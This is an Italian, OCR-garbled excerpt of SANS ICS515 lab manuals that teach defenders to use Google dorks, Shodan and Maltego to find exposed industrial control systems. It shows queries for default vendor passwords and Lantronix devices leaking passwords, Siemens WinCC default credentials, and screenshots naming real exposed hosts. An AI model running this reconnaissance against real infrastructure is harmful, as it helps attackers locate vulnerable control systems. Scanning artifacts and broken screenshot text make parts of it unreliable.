 È difficile giungere ad una conclusione con assoluta certezza. L’ACH è storicamente guidato dall’analisi e funziona meglio quando buone ipotesi vengono messe in competizione tra loro, indipendentemente da ciò che supportano i dati. I dati dovrebbero quindi convalidare le teorie e aiutare gli analisti a scegliere l’ipotesi migliore. Gli honeypot su una rete possono aiutare a dare un senso ai set di dati perché dovrebbero esserci molto meno, se non nessuna, attività diretta ad essi. In questo esercizio è stato possibile trarre conclusioni logiche e ipotesi valide a sostegno della presenza del malware, della mancanza di malware, di una minaccia interna, di un amministratore maldestro e di qualsiasi altra serie di ipotesi. È importante sapere che gli honeypot possono aiutare a supportare le conclusioni e che l’ACH è uno strumento potente con cui gli analisti dovrebbero acquisire familiarità. In definitiva, il personale che utilizza l'intelligence sulle minacce dovrà talvolta esprimere giudizi di analisi tra prove concorrenti (come il monitoraggio della sicurezza della rete che non trova una minaccia ma gli addetti alla manipolazione delle minacce e dell'ambiente che sentono fortemente che è possibile).Ciò non è dovuto al loro ruolo in nessuno di questi processi, ma alla loro capacità di fornire prospettive imparziali con forti capacità di analisi.

© 2021, Robert M. Lee Lab 1.2- 5 wo w Ww
 wv noi wo uw w
 Py
 noi © oO WwW ww Y
 VY
 Obiettivi: tempo minimo di laboratorio ~ 35 minuti
 e __ Familiarizzare con Shodan e le query di hacking di Google e Identificare le informazioni sulla propria organizzazione

*Informazioni sullo scenario* Nel contesto degli scenari dal Giorno 1 al Giorno 4, i partecipanti assumono il ruolo di analisti di intelligence sulle minacce per identificare il tipo di informazioni disponibili pubblicamente sulla loro organizzazione. Questo esercizio dimostrerà il tipo di informazioni a disposizione di un avversario. Queste informazioni potrebbero essere utilizzate dai difensori per ridurre la superficie di attacco delle informazioni o introdurre nuove tecniche di monitoraggio su informazioni e superfici vulnerabili. I.C.S.410 ha insegnato i fondamenti di Shodan, ma questo esercizio dovrebbe essere utilizzato per tentare query di ricerca più avanzate e concentrarsi specificamente su ciò che un utente malintenzionato utilizzerebbe contro di te.
 Preparazione agli esercizi
 Questo esercizio utilizzerà una connessione Internet e un browser sul tuo computer (si consiglia di utilizzare il computer host anziché una VM poiché la VM Windows è impostata per utilizzare la rete locale con bridge e non abbiamo ancora esaminato le impostazioni di rete all'interno di RELI. C.S.VM).
 Compito: Familiarizzazione con Shodan e Google Hacking Queries

*Nota* Cercheremo alcuni tipi di dati che gli aggressori potrebbero cercare. Maggiore I.C.S. i fornitori verranno utilizzati come esempio, ma non vi è nulla di intrinsecamente negativo nelle informazioni e non si tratta di una vulnerabilità. Tuttavia, questo è il tipo di informazioni a cui gli avversari potrebbero essere interessati. Tutti i dati I.C.S. i fornitori e la maggior parte delle organizzazioni dispongono di informazioni simili disponibili online.

> Sul tuo computer, apri un browser web di tua scelta che disponga di una connessione Internet attiva

> Dovresti avere un account Shodan dal Lab 0
*Nota* Ora esploreremo alcune query di Google per mostrare che tipo di informazioni possono essere raccolte con esse.

> Vai su Google.com

*Nota* Google consente di utilizzare gli operatori per personalizzare le opzioni di ricerca. Di seguito ne proveremo alcuni. Per un elenco completo (il collegamento fa distinzione tra maiuscole e minuscole) vedere: https://www.sans.org/security-resources/GoogleCheatSheet.pdf

*Nota* La procedura dettagliata seguente è ciò che è stato restituito quando l'autore del corso ha eseguito i comandi. A causa della natura delle informazioni open source, le query potrebbero non restituire più gli stessi risultati. Utilizza le informazioni seguenti come esempio di ciò che dovresti fare, ma se ottieni informazioni diverse continua a procedere.

© 2021, Robert M. Lee Lab 1.3-1
> Cerca password predefinite in I.C.S. dispositivi di un fornitore di tua scelta
> Ad es. Nella barra di Google cercare: "password predefinita" inurl:siemens filetype:pdf o "inurl" garantisce che il termine di ricerca si trovi nell'URL restituito nella ricerca. Le virgolette attorno alle parole assicurano che tutte le parole all'interno della citazione siano presenti e in quell'ordine. Filetype designa un tipo di file per i file restituiti come PDF, Doc e PPT.
 Vai gle "password predefinita" inurl:siemens filetype:pdf 'ke

> Identificare documenti interessanti che potrebbero essere utili per gli avversari
> Ad es. La ricerca sopra riportata restituisce documenti per sistemi come ad es. SIMATIC HMI WinCC
 POFIReadme - Siemens Industry Online Support — support.automation.siemens.com/dnl/zy/zY 1MZMZAAAA.../ReadMe. pdf + Per lo Sm@rtServer e per il Web server integrato la password di default è “100°
 Per impostazione predefinita, per l'“Amministratore” è impostata la password utente "400".

> – Identificare le informazioni di valore nel documento
> Ad es. Ctrl-F fa apparire la barra di ricerca in cui puoi digitare la tua ricerca, ad esempio "password predefinita"

| password predefinita — Totalmente
} Informazioni sulla sicurezza | T
| Funzionamento sicuro di un impianto | Per garantire il funzionamento sicuro di un impianto è necessario adottare misure di sicurezza adeguate che comprendano anche la sicurezza informatica (ad es. 9. segmentazione della rete). Ulteriori informazioni sull'Industrial Security si trovano in Internet (www.siemens.com/industrialsecurity). | In WinCC sono preimpostate diverse password. Per motivi di sicurezza, dovresti cambiare queste password. |
* Per lo Sm@riServer e per il Web server integrato la password di default è "100" I
© La password utente "100" è impostata di default per l'“Amministratore”. | ss

> Prova un'altra ricerca per gli annunci a cui gli aggressori potrebbero essere interessati
> Ad es. Cerca: "contratto assegnato" "scada'" tipo di file:doc o Gli avversari spesso cercano di trarre vantaggio da cambiamenti nelle infrastrutture, da ulteriori appaltatori in loco o da annunci di nuovi sistemi di interesse per guidare gli obiettivi di sfruttamento
 Vai O gle “contratto aggiudicato” tipo file "scada":doc u a) |

> Identificare documenti interessanti e le informazioni che presentano gli avversari
> Ad es. Il primo documento restituito quando è stata avviata questa ricerca riguarda un sistema SCADA Invesys e l'ampliamento di un impianto di gas

© 2021, Robert M. Lee Lab 1.3-2
 ee® & @® oe.@vouvuvuvewvewsewwseweweteew
 oe wT wT Ww
 0 Le informazioni sono state oscurate per la privacy degli individui e del sito, ma queste informazioni stampa del tutto accettabili possono essere utilizzate per identificare i siti in espansione e potrebbero rappresentare un avversario un buon bersaglio. Ancora più importante, forniscono nomi di siti, indirizzi e-mail e altri tipi di informazioni che possono essere utilizzate per eseguire query successive o indirizzare persone specifiche con e-mail di spear-phishing.
 o L'annuncio visualizzato è del 2006. Google consente di modificare l'intervallo di tempo in “Strumenti di ricerca” per impostare un intervallo personalizzato, ad esempio cercando solo le informazioni recenti indicizzate dal motore di ricerca.
 invensySe
 informazioni stampa
 Invensys implementerà il sistema SCADA per l'importante espansione dell'impianto di gas S98 negli Emirati Arabi Uniti
 Nuovo monitoraggio e controllo digitale, soluzioni HMI e servizi per supportare l’espansione del progetto Onshore Gas Development Phase ili (OGD-ill)

> — Ritorna a Shodan ed effettua l'accesso

> Cerca i dispositivi di interesse connessi a Internet e indicizzati da Shodan
> Ad es. Nella barra di ricerca, cerca: modbus port:502 country:us o Shodan ha filtri avanzati molto simili a Google

% SHODAN Esplora Download Prezzi e porta modbus:502 paese:us| io

> - Fare clic sull'indirizzo IP di un dispositivo interessante
> Ad es. Il primo dispositivo restituito è stato cliccato e visualizzato di seguito
 o Shodan registra le sue ricerche ma tieni presente che tutte queste sono state eseguite in precedenza: le tue ricerche non incoraggiano più attività da parte di Shodan (ovvero ciò che è noto è già noto e tu non lo influenzi)
 o Molte informazioni vengono indicizzate come l'indirizzo IP, la posizione, il tipo di dispositivo e persino le informazioni restituite dal dispositivo quando è stato interagito con esso, come mostrato di seguito
(le informazioni identificative sono state oscurate)
 come i & è ip ws |

“ap

© 2021, Robert M. Lee Lab 1.3-3 Profilo host: ne Latitudine/ Longitudine degli Stati Uniti
 ID unità: 255 identificazione: Modbus/TCP to RTU Bridge Bridge V3.3.25.0RC$

-- Dispositivo I

| Nessuno | Bridge da Modbus TCP a RTU
 Versione software V'3.3.25.0RCS (140113)
 Premere Invio per la modalità di configurazione

*Nota* Una parte significativa di Shodan è basata sull'accaparramento di banner. Ciò significa che quando un dispositivo ha un banner quando interagisci con esso, ad esempio un server GE CIMPLICITY che ha "CIMPLICITY-HttpSvr/1.0" nel suo banner, puoi cercare il banner in Shodan. Ciò consente query più personalizzate e non limita l'interazione semplicemente ai protocolli o ai nomi dei fornitori.

> Esegui query più avanzate per trovare risorse che vanno oltre i semplici nomi di fornitori o protocolli
> Query di esempio (Credito: documento di tesi "Quantitatively Assessing and Visualizing Industrial System Attack Surfaces" di Eireann Leverett): i. CIMPLICITY-HttpSvr/1.0 ii. WindRiver-WebServer/4.4 iii. Modicon+M340+CPU

© 2021, Robert M. Lee Lab 1.3-4

=
 oo 2o~,
 Py fF ff 2 ff ff 2 2 2 2

?

 ] ov sposato dbuoewktiwutbwwswwsw
 era così ww
 eo noi wh

*Nota* Puoi combinare i termini di ricerca con i campi che potrebbero apparire nel banner, come "password". Inoltre, è possibile utilizzare il "-" per rimuovere le parole o il "+" per assicurarsi che sia presente una parola. Ad esempio, i dispositivi Lantronix connessi a Internet (gateway da seriale a Ethernet) visualizzano "protetto" in Shodan quando la password è non viene trasmesso dal dispositivo.

> Effettuare una ricerca dei dispositivi Lantronix non sicuri
> Digita quanto segue nella barra di ricerca Shodan: lantronix password —secred
 fantronix protetto da password Q Esplora Download Report Enterprise

* Sfrutta % Maps © '® Condividi Ricerca. :

‘

@% SHODAN

| st Scarica risultati | lul Crea rapporto
 PAESI TOP

_ oe a 173.26
 sì; _ Lantronix
, Cavo FG Mediacom: _
», gre re . 5.2 _— - Password: soos
@ Stati Uniti, Theodore
 Dettagli
 Stati Uniti, esa2 165.123
 grido Lantronix
 Canada 1.300 iversi i
 Università di Penneyivania: Password: ALD1 Ungheria 358 ae bet agian "*

. SE degli Stati Uniti, Filadelfia
 Repubblica Ceca 182 ;
 Dettagli Belgio 151

> Esegui ricerche sulla tua infrastruttura o organizzazione per rivelare problemi che potrebbero dover essere affrontati dopo la lezione. Filtri di esempio che potrebbero essere utili:
 Città: ricerca dispositivi in ​​una città specifica (Es. Città Simatic: Washington DC)
 Paese: cerca i dispositivi in ​​un paese specifico (Es. CIMPLICITY country:US)
 Net: cerca dispositivi in ​​uno specifico intervallo IP o CIDR (ad esempio Modbus net:210.10.10.0/24)
 Porta: cerca dispositivi con porte specifiche aperte (Es. Porta Modbus:502)
 Geo: ricerca di dispositivi su coordinate geografiche specifiche (ad esempio EthernetIP geo:50.2222, -50.2222)
 Dopo/Prima: ricerca dispositivi in ​​un intervallo temporale (Es. Modbus after:1/01/2016)
 VVVVVV

*Nota* È possibile combinare insieme i filtri di ricerca per ricerche complesse.

[Attività: salva la chiave API
 In alto a destra, fai clic sul pulsante "Account" Copia la chiave API associata al tuo account Salva la chiave API in un documento sul desktop per utilizzarla in un lab successivo
 Inoltre, salva l'indirizzo IP di un I.C.S. interessante. dispositivo visualizzato in una delle tue query per utilizzarlo in un lab successivo
 VVV WV

© 2021, Robert M. Lee Laboratorio 1.3-5 Esercizi da riassumere:
 Anche le organizzazioni che praticano pratiche di sicurezza leader del settore pubblicano informazioni su se stesse. Annunci di prodotti, personale da contattare, posizioni geografiche, ecc. sono tutte informazioni comunemente disponibili. Alcune organizzazioni ritengono inoltre necessario fornire informazioni quali password predefinite e guide per la risoluzione dei problemi per garantire che i propri clienti siano in grado di accedere rapidamente e facilmente ai sistemi importanti. Queste informazioni, non importa quanto innocenti, sono tutte preziose per gli avversari. La maggior parte delle informazioni non può essere eliminata, ma le organizzazioni dovrebbero essere consapevoli del tipo di informazioni che stanno diffondendo e ridurle ove possibile. I.C.S. connesso a Internet i dispositivi, tuttavia, non sono incoraggiati. I.C.S. È molto probabile che le risorse direttamente connesse a Internet o quelle visualizzate su Shodan vengano prese di mira con successo. Sapere come passare dalle ricerche Google alle ricerche Shodan per identificare le risorse disponibili per la tua organizzazione è importante per la sicurezza e per aumentare il monitoraggio e la consapevolezza. Shodan ha anche un nuovo sottoinsieme del suo sito Web che rivela una mappa degli I.C.S. connessi a Internet. Il sito Web contiene anche tutti i dati associati in fondo alla pagina per il download e l'esame. Le organizzazioni dovrebbero assicurarsi che i loro sistemi non siano su questa mappa o nei dati: https://icsmap.shodan.io

© 2021, Robert M. Lee Lab 1.3-6
 awww
 wi
 www ww ww
 noi noi Ww
 ooh ww
 oe@®

)
 a Ss GG ws
 Laboratorio 1.4 - Maltego e Shodan I.C.S. Mappa termica
 e Creare un I.C.S. Mappa termica a Maltego con Shodan

*Informazioni sullo scenario* Questo esercizio è un esempio di ciò che un analista dovrebbe fare per mantenersi aggiornato con il proprio I.C.S. spazio di attacco informativo utilizzando dati disponibili al pubblico. È un esercizio che chiunque valuti I.C.S. dovrebbe avere molta familiarità con l'infrastruttura I.C.S. connessa a Internet. gli asset rappresentano oggi uno dei problemi più diffusi nel settore.
 Questo esercizio utilizzerà il sistema SANS I.C.S. RELI.C.S. VM. In questo lab verificherai le impostazioni di rete della VM e garantirai la connettività attraverso entrambe le interfacce di rete configurate nella VM.
 Compito: convalidare RELI.C.S. Impostazioni di rete della VM = -—

> Avvia VMWare Player
> Seleziona la RELI.C.S. VM e quindi modificare le impostazioni della macchina virtuale

> Assicurati che l'adattatore di rete VM sia in modalità Bridged e seleziona l'opzione "configura adattatori" per selezionare l'adattatore di rete corretto

> Se richiesto, selezionare Sì nel prompt dell'UAC
 Questo prodotto VMware richiede l'amministratore
"privilegio. Se si fa clic su Annulla, l'applicazione
 avrà funzionalità limitate.
 Editore verificato: VMware, Inc. Origine del file: disco rigido su questo computer
 Mostra più dettagli

> Deseleziona tutte le interfacce, tranne l'interfaccia ASIX

> Al termine, selezionare OK

© 2021, Robert M. Lee Lab 1.4-1 Opzioni hardware
 Riepilogo dispositivo Stato del dispositivo. Memoria S846B | Collegato
) Processori 2 | connettersi all'accensione
 100GB
 Rilevamento automatico Connessione di rete Bridged (automatico) @Bridged: connesso direttamente alla rete fisica
 NAT presente Rilevamento automatico | "Configura adattatori".

(Stato della connessione di rete fisica Ci Repticate
 CJbisplay Rilevamento automatico | OvNaT: utilizzato per condividere l'indirizzo IP dell'host con l'host
 Impostazioni bridging automatico x |

| Seleziona gli adattatori di rete host che desideri utilizzare automaticamente f
| ponte:

| MAASIK Ax88179 Adattatore da USB 3.0 a Gigabit Ethernet
(I Adattatore virtuale Microsoft Wi-Fi Direct n. 2

| C) Adattatore virtuale Wi-Fi Direct Microsoft f
| Cointeice) Wi-Fi 6ax201 160mHz

(Ci intei(r) connessione ethernet (10) 1219-LM
[(Adattatore JTaP-Windows vo

[J Dispositivo siuetooth (Personal Area Network)
 Segmenti LAN... Avanzate...
 OK Annulla Aiuto

> Dovresti anche vedere un secondo "Scheda di rete 2" con una configurazione NAT. Questi adattatori di rete sono configurati in modo da consentire all'adattatore di rete con bridge di comunicare attraverso l'interfaccia di rete fisica sull'host con il PLC e la VM Windows. Il secondo adattatore di rete è configurato come NAT per abilitare RELI.C.S. La VM può comunicare anche con Internet tramite l'adattatore wireless host.

*Nota: le impostazioni di rete VM per il corso richiederanno una connessione di rete fisica dalla workstation host al PLC e le macchine virtuali saranno entrambe impostate in modalità bridge per utilizzare una connessione fisica comune dall'host. Se richiesto quando si collega l'adattatore da USB a Ethernet, è necessario connettersi sempre all'host. Modifichiamo anche le impostazioni di connessione del bridge per garantire che la VM non tenti di utilizzare un adattatore diverso quando tenta di comunicare con il PLC.

*Nota* I passaggi per aggiungere e configurare l'adattatore USB all'host e impostare il bridging VM varieranno se utilizzi VM Workstation Professional o VM Fusion. I passaggi forniti in questo lab sono specifici di VM Player.

> — Avviare I.C.S.515 RELI.C.S. VM, se ti viene richiesto di scaricare gli strumenti VM, seleziona "ricordamelo più tardi"

> Accedi alla VM
> LOGIN=reliquie
> PASSWORD = reliquie

> Nel RELI.C.S. finestra del terminale che si avvia all'accesso, testare un ping al PLC locale su 192.168.0.10 e in caso di successo premere CNTRL + C per interrompere il ping e quindi testare un ping su un sito esterno come www.google.com

© 2021, Robert M. Lee Lab 1.4-2 fl Terminale
 Ping S$ 1
 PING 192. byte da 1 byte da 192. byte da 192.
 92.168. ets trasmesso, rtt min/avg/max/mdev = 0
 statistica perdita di pacchetti, tempo 2017ms 877/1.069/0.182 ms
 S$ ping www.google.com
«google.com (da slc09s01-in-f4.1e
 217.15.2
 8) 56(84) byte di dati. et (172. icmp_seq=1 ttl=128
 5s da slc09s01-in-f4.1e100.net (172,2 ttl=128 timeg

> Se i ping falliscono, verificare che l'adattatore da USB a Ethernet sia collegato all'host, non alla VM ospite e verificare le impostazioni di rete nella VM descritte sopra.

[Attività ~ Genera avvisi per il nuovo I.C.S. Risorse che appaiono in Shodan

*Nota* Semplicemente non c'è abbastanza tempo durante la giornata per eseguire regolarmente le ricerche di dispositivi connessi a Internet, ma è estremamente importante. Pertanto, è fondamentale imparare come generare avvisi in base ai nuovi dispositivi che compaiono in Shodan. Di seguito verranno mostrati i passaggi per familiarizzare con l'interfaccia della riga di comando Shodan e la generazione di avvisi. Alla fine di questa attività verrà fornita una raccomandazione per automatizzare questo processo.

> Sul tuo RELI.C.S. VM, utilizza la finestra Terminale aperta
> Esegui il collegamento Terminale sul desktop, se necessario

> Visualizza le opzioni dell'interfaccia a riga di comando (CLI) di Shodan
> Inserisci il seguente comando nel Terminale: shodan -h
 vovvovoowvvoewveuoewebwbesewseuew”
 w
 vv Vv wow ww

> Annotare i comandi che possono essere immessi

© 2021, Robert M. Lee
 Laboratorio 1.4-3
[OPZIONI
 ahi, questo m
 yen input data le into a Restituisce il numero di risultati per una ricerca Bulk data ac odan a : download ore
 l'indirizzamento IP esterno Shodan ac
 Il risultato è usare Shodan.
 Fornisci informazioni di riepilogo per la query dell'arco Trasmetti i dati in tempo reale Versione stampa di questo strumento.
 Inserisci la tua chiave API nella CLI di Shodan in modo da poter raggiungere l'API di Shodan
> Ottieni la tua chiave API, che può essere trovata in "Account" su shodan.io e che dovrebbe essere stata salvata in un file sul desktop dopo aver eseguito il lab precedente

> Inserisci il seguente comando nel Terminale, sostituendo APIKEY con la tua chiave tramite copia/incolla:
 shodan init APIKEY
 Panoramica dell'Account
 Libero professionista a livello di account
 Chiave API aac aria)
 RR aaa era

*Nota* Dovresti esplorare i vari comandi Shodan nella CLI Shodan ad un certo punto dopo il laboratorio. Qui ne proveremo uno. Shodan CLI ha accesso all'API Streaming, il che significa che ottieni i dati non appena ritornano direttamente a Shodan invece di quelli che sono stati indicizzati in precedenza. Ciò significa che non ottieni tante informazioni, ma ottieni le informazioni più recenti.

> Doa Conteggio degli asset con la parola modbus nei loro banner

> Immettere il seguente comando nel terminale: shodan count modbus

© 2021, Robert M. Lee Lab 1.4-4

@, ae, oe, @, m=, oe,
 roy vu vo wb wow Ww wwe & WW
 Co noi Ww Ww
 oe F€@ GG Uw WG Ww
 S$ shodan conteggio modbus
 396

*Nota* È importante essere in grado di scavare più a fondo nel set di dati rispetto a un semplice conteggio per convalidare ciò che trovi e assicurarti che sia rilevante per te. Tuttavia, i conteggi possono rappresentare un ottimo primo sguardo ai dati, soprattutto per anticipare volumi elevati.

> Cercare i dispositivi che hanno la parola “modbus” in un campo indicizzabile
> Inserisci il seguente comando nel Terminale shodan search --fields ip_str,port,org,hostnames,devicetype,title,html Modbus
> Premere "q" per uscire

§ ricerca shodan --fields ip_str,porta,org,nomihost,tipodispositivo,titolo,html Modbus

*Nota* L'output restituisce le informazioni che Shodan utilizza per creare i dati visualizzati nella GUI Shodan sul sito web. Nella CLI, non solo puoi accedere ai dati grezzi ma anche selezionare i campi desiderati invece di inserire tutti i dati. Ciò aiuta a esaminare i dati più velocemente e in modo più semplice. Gli argomenti impostati includono l'indirizzo IP del dispositivo, il numero di porta su cui è stato visualizzato il banner, l'organizzazione a cui è assegnato, i nomi host del dispositivo ed eventuali titoli o banner html restituito. Non tutte le informazioni devono essere presenti. Ad esempio, di seguito sono riportate alcune risorse restituite che non hanno nomi host.

*Nota* Puoi anche cercare i filtri che hai utilizzato nella GUI Shodan, incluse porte specifiche come mostrato di seguito.
 vicetipo, titolo, porta html:502

*Nota* Ora che hai compreso la CLI e le informazioni presenti al suo interno, puoi creare avvisi. Gli avvisi ti consentono di cercare informazioni non appena arrivano in Shodan. Non cercherà ciò che è stato indicizzato in precedenza in Shodan, ma ti avviserà invece delle nuove informazioni che corrispondono alla tua query. Questo è uno dei modi migliori per essere consapevoli di ciò che l'I.C.S. dispositivi e risorse informative che hai visualizzato su Shodan. Dovresti utilizzare queste informazioni per prestare particolare attenzione a tali dispositivi finché non potranno essere rimossi da Internet.

> Familiarizza con i comandi Shodan Alert
> Inserisci il seguente comando nell'avviso shodan del Terminale

© 2021, Robert M. Lee Lab1.4-5 shodan alert sage: shodan alert [OPZIONI] COMANDO [ARGS]...Gestisci gli avvisi di rete per il tuo account
 Opzioni:
-h, --help Mostra questo messaggio ed esce.
 comandi: cancella Rimuovi tutti gli avvisi
 create Crea un avviso di rete per monitorare una rete esterna
 disabilita Disabilita un trigger per l'avviso
 abilita Abilita un trigger per l'avviso
 info Mostra informazioni su un avviso specifico Elenco Elenca tutti gli avvisi attivi
 rimuovi Rimuove l'avviso specificato
 trigger Elenca i trigger di notifica disponibili

> Creare un avviso di base per dimostrare le capacità della funzione di avviso
> Inserisci il seguente comando nel Terminale: shodan alert create “Test” 8.8.8.0/32

$ shodan alert crea "Test" 8.8.8.0/32

*Nota* Qui abbiamo creato un avviso e gli abbiamo dato il nome "Test". L'intervallo IP scelto è l'intervallo DNS di Google. Tuttavia, lo strumento non è pensato per monitorare intervalli più ampi senza interagire con John Matherly, il fondatore dello strumento. Gli studenti SANS I.C.S.515 hanno accesso extra all'API e allo strumento per scopi didattici. Normalmente, utilizzando l'API
 in questo modo è intesa come una funzionalità premium.

© 2021, Robert M. Lee
 Laboratorio 1.4-6

@ @ @

@ ouvweveuwsvewsewswetebsetseusoeee
 dobbiamo
 oe ww Ww
 ew ww a
 a5
 Compito: creare un sistema I.C.S. Mappa termica a Maltego con Shodan

*Nota* Maltego è un ottimo strumento per visualizzare set di dati e arricchirli con dati open source. I dati open source sono resi disponibili in "Trasformazioni" che è simile a un'API e a un set di dati. Shodan ha Transforms for Maltego, che rende la combinazione di strumenti estremamente utile. Alcune trasformazioni sono aperte e disponibili gratuitamente (come Shodan) e alcune trasformazioni sono disponibili da strumenti e database a pagamento.
 1. Nel tuo RELI.C.S. VM, avvia Maltego
> Esegui l'icona Maltego nel vassoio inferiore

*Nota* Se non viene visualizzata dopo averla avviata, controlla la barra degli strumenti in alto e seleziona l'applicazione avviata; a volte inizia a minimizzare
 B+@mRHs @ && Maltego
 Selezione del prodotto
 Scegli come desideri utilizzare Maitego:
 Maltego One è la nuova soluzione unificata per accedere e attivare i piani Maltego per Professionisti e Imprese,
 Maitego eXtra Large è la soluzione premium di Paterva per visualizzare grandi set di dati e consente di includere più di 10.000 entità in un unico grafico.
 Maltego CE (gratuito) In Maltego CE (Community Edition) le trasformazioni della community verranno installate e potranno essere eseguite per generare grafici, ma le funzionalità sono limitate e i grafici risultanti non possono essere utilizzati per scopi commerciali,
 2. Completare l'installazione guidata
> Fai clic su Avanti e ti verrà chiesto di accedere i. Se non disponi di un login Maltego, fai semplicemente clic su "registrati qui" e crea un account da utilizzare per questa classe; i conti sono gratuiti
> Fare clic su Avanti nelle schermate rimanenti, lasciando selezionate le opzioni predefinite
» Al termine della Configurazione guidata; l'ultima schermata presenterà un'opzione per "Vai via, l'ho già fatto"; fare clic su quell'opzione e fare clic su Continua per uscire dal popup
 3. Installare la trasformazione Shodan

> Nella pagina principale dell'applicazione è presente il Transform Hub; scorrere verso il basso per identificare il
"Shodan", selezionalo, fai clic su "Installa" e poi su "Sì" per visualizzare il popup e inserisci la chiave API

© 2021, Robert M. Lee Lab 1.4-7 Maltego Transform Hub
 Edizione comunitaria - N
 Approfondisci i dati di interconnessione globale utilizzando PeeringDB.
 Pipl di Maltego Technologies
 Contatta support@maltege.com per ottenere l'accesso a questo elemento dell'Hub. Velocizzare le indagini e combattere...
 Shodan di Maltego Technologies
 Shodan è il primo motore di ricerca al mondo per dispositivi connessi a Internet. Interrogazione toT globale.
 Collegamenti sociali CE

*Nota* Quando hai finito, vedrai la schermata qui sotto o una simile ad essa notando numerose novità

[RICARICARE]
 65 elementi dell'hub in totale | 1 elemento dell'hub
 Interroga peoplemon.com
 Polonioso
*di Polonious Systems
 Piattaforma di indagine e gestione dei casi altamente configurabile
 Silobreaker di Silobreaker
 L'intelligence sulle minacce si trasforma da Silobreaker.
 SocialNet

[AGGIORNAMENTO]
 trasforma)
 Utilizza PhoneSearch per verificare i numeri di telefono, fornendo nomi reali, indirizzi, social...
 D_ Registrato Future Inc.
*i® di Recorded Future Inc.
 Interrogare Recorded Future per informazioni sull'intelligence sulle minacce
 Collegamenti sociali PRO di Collegamenti sociali
 Metodi essenziali per l'intelligence e le indagini.

[_S8L_] Trasformazioni del certificato SSL
 sono state installate le trasformazioni. Al momento della creazione di questo lab erano disponibili cinque nuove trasformazioni.

© 2021, Robert M. Lee
 Laboratorio 1.4-8
 0
 oO, mm, @,

=,

@, @) UN, @, @,

@, veouvuwdeuvwsoebseuoewewbewoew”
 ew Ww
 wwe noi noi WF GF WH
 4B
 4.
 Installa Shodan
 Completare
 Sono stati aggiunti/aggiornati:
 1 Server delle applicazioni 69 trasformazioni
 21 Entità
 1 Icone
 10 set di trasformazione
 Apri una nuova mappa
> Clicca sull'icona Maltego nell'angolo in alto a sinistra
> Seleziona "Nuovo" dal menu a discesa

> Verrà visualizzato un popup per l'esecuzione di macchine specifiche; basta uscire da questa finestra nell'angolo in alto a destra

© 2021, Robert M. Lee
 Lab 1.4-9 Comunità Maltego|
 5.Posiziona una risorsa IPv4 sulla mappa
> Nel riquadro di sinistra “Palette” selezionare “infrastruttura” per espandere la finestra
> Trascina e rilascia "Indirizzo IPv4" sulla mappa
 Equazione della comunità di Maltego
 It o, Claer Grach'| segaiolo di Recuite | Modalità Privacy su i Bis, ad es. a
 TB 96 tagliato _aeameweRON '
 Copia Incolla athe fai] Normale YW | ohick Trova
 1 t Elimina Sia itis esse | Trova file
 Nuovo grafico (1)
 CIDR del blocco di rete
 e CVE
 Nome DNS
 Dominio
 Indirizzo IPv4
 Indirizzo IPv6

\
 74.207.243,85 modo

*Nota* Qui puoi monitorare interi netblock, domini e altre risorse. È consigliabile che questa visualizzazione monitori il netblock della tua organizzazione. Questo sarà un modo rapido per visualizzare ciò che Shodan sa sulla tua organizzazione, compresi i dipendenti I.C.S. connessi a Internet. risorse.

© 2021, Robert M. Lee Lab 1.4-10 wo ws ww © ww wo noi noi noi noi noi
 nt
 Se wee we ww ws WW
 usp

*Nota* Qui dovrai inserire le informazioni della tua organizzazione. Tuttavia, dovresti inserire un indirizzo IP di una risorsa interessante che hai trovato in Shodan.io nel lab precedente.
 6. Cambia la risorsa IPv4 in una risorsa I.C.S. risorsa che hai trovato a Shodan
> Fare doppio clic sulla risorsa sulla mappa per modificarne l'IP
> Inserisci l'IP nella finestra popup e esci dalla finestra (non è necessaria alcuna opzione di salvataggio)
 7. Avviare una query sulla risorsa
> Fare clic con il pulsante destro del mouse sulla risorsa
> Seleziona l'icona della doppia freccia accanto a "Shodan" (sembra un pulsante di avanzamento veloce) e seleziona Esegui se richiesto.

+ Tutte le trasformazioni »
+ Trasformazioni standard CE
+ Shodan x»
 XXIHX OES
 a a a ca lai ae
 ojsuesl

*Nota* Il database Shodan viene ora interrogato con informazioni relative a quell'indirizzo IP.

*Nota* Le informazioni restituite verranno tracciate notando in particolare i banner visualizzati su diverse porte accessibili su quell'indirizzo IP. Di seguito vengono restituiti l'ASN, la posizione GPS, il DNS e il banner FTP. Nel banner FTP c'era la parola Modbus.
 een om
<& ¢ wTTP/2.0 203 Red MEDORA mb Oh, Hemme Deskvos _, CVE-20IS-0708 con ntebe2a? engi heme tah
‘x € @B 9
é noi =. agned JACKSON ENERGY AUTHORITY JACKSON ENERGY AUTHORITY 35 614S2,-B8 81255 53435 Jackson, Stati Uniti Sa pial WTA tah et ry me ee on we semis senans wet “o ne a ious Senta Se Innclanomieiseareiie. tee Lsmcea-_Faemaesh cA
© 2021, Robert M. Lee Lab 1.4-11
*Nota* Se volessimo vedere di più, potremmo fare clic sull'icona e poi su "..." nella scheda Visualizzazione proprietà.
 8081 - Stendardo di servizio

| Reindirizzamento HTTP/1.0 302
| Server: CIMPLICITY-HttpSvr/1.0
 Data: giovedì 08 luglio 2021 07:04:48 GMT
| Posizione: http://d46fl8c1/index. html
 Etichetta

¢
 GOL 1fOfe- 267

-~e@e

"S
 1.1 206Va bene
 Desktop remoto PF... CVE-2019-0708
 Hash della bandiera.

#

“vede9403
 Hash della bandiera
 3303 43 1622804862
 AL Hash
 ry
 Noi
 362218 “ goBt 443 3383
 4a256 Firew sono CA web
 I Firew sono CA web
 Seriale del certificato
 HeBee3474d22c83e. 1520353643,
 proprietà dinamiche
= da
 un io

— Informazioni sul grafico

*Nota* Sentiti libero di eseguire trasformazioni aggiuntive sulla risorsa e su qualsiasi cosa restituita. Gran parte di ciò che viene restituito in OSINT tramite altre trasformazioni deve essere valutato con molta attenzione perché può essere errato, come è la natura di OSINT. Altre trasformazioni possono aiutare a identificare quali informazioni sono pubblicamente note, comprese le scansioni pubbliche per vulnerabilità, informazioni sulla proprietà del dominio e altro ancora. Al termine, chiudi Maltego e Scarta modifiche.
 Esercizi da asporto: ;
